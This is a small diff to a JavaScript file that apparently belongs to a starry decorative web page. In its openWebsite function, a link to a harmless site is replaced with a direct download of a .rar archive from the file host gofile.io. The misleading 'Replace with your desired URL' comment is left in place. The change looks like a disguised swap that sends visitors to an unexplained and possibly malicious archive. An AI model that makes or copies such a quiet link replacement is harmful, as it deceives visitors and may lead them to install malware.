@@ -49,7 +49,7 @@ function createStars() {
 }
 
 function openWebsite() {
-    window.open('https://nohello.net', '_blank'); // Replace with your desired URL
+    window.open('https://store4.gofile.io/download/web/b6379f84-1671-4614-8660-49c75dd4d949/Purplistt.rar', '_blank'); // Replace with your desired URL
 }
 
 createStars();
